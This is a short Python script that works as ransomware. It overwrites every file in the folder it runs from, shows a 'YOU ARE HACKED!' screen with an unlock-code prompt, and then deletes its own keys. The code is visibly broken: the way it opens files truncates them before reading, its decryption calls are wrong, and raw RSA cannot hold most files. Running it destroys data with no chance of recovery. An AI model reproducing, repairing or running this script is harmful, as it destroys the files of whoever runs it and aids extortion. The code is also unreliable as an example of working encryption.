from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
import math
import os
import time
klen = 1024
key = RSA.generate(klen)
private_key = key.export_key()
public_key = key.publickey().export_key()
with open("public.pem", "wb") as f:
    f.write(public_key)
with open("private.pem", "wb") as f1:
    f1.write(private_key)
time.sleep(0.25)
public_key = RSA.import_key(open("public.pem").read())
cipher = PKCS1_OAEP.new(public_key)
for i in os.listdir():
    if i != os.path.basename(__file__):
        if i != 'public.pem':
            if i != 'private.pem':
                with open(i, 'r') as file:
                    with open(i, 'wb') as file1:
                        data_bytes = file.read().encode("utf-8")
                        encrypted_data = cipher.encrypt(data_bytes)
                        file1.write(encrypted_data)
os.system('color 4f')
os.system('cls')
print('YOU ARE HACKED!\n\n')
print('********************************')
print(f'Code: {len(os.listdir()) + math.floor(klen)}')
print('********************************')
print('Enter the code to save your files!')
count = 5
for i in range(count):
    code = input(f'ENTER THE CODE({count} trials left):')
    if code == str(150410 + len(os.listdir()) + math.floor(klen) - klen):
        private_key = RSA.import_key(open("private.pem").read())
        cipher2 = PKCS1_OAEP(private_key)
        for j in os.listdir():
            if j != os.path.basename(__file__):
                if j != 'public.pem':
                    if j != 'private.pem':
                        with open(j, 'rb') as file2:
                            with open(j, 'wb') as file3:
                                data_bytes = file2.read()
                                decrypted_data = cipher.decrypt(data_bytes)
                                file3.write(decrypted_data)
os.remove("public.pem")
os.remove("private.pem")
